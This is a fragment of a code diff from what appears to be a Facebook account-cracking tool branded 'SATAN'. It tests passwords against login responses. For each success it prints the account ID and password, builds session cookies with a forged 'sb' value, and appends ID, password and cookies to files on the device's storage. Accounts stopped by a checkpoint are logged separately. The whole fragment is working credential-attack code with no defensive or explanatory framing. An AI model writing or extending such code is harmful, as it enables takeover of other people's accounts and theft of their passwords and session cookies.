+			if 'session_key' in po:
+				uid = str(po['uid'])
+				print('\r\r\033[1;32m [SATAN-OK] '+uid+' | '+pas+'|'+asha(uid)+'\033[1;32m')                                
+				ckkk = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
+				ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
+				cookies = f"sb={ssbb};{ckkk}"
+				#print('\033[1;37m [🍪] Cookies :- '+cookies)
+				open('/sdcard/SATAN-OK.txt','a').write(uid+'|'+pas+'|'+cookies+'\n')
+				oks.append(uid)
+				break
+			elif 'www.facebook.com' in po['error']['message']:
+				uid = str(po['error']['error_data']['uid'])
+				#print(f'\r\r\033[1;33m [SATAN-CP] '+uid+' | '+pas+'\033[1;97m')
+				open('/sdcard/SATAN-CP.txt','a').write(uid+'|'+pas+'\n')
+				cps.append(uid)
+				break
+			else:
+				continue
+		loop+=1
+	except requests.exceptions.ConnectionError:
+		time.sleep(20)
+	except Exception as e:
+		pass
+menu()
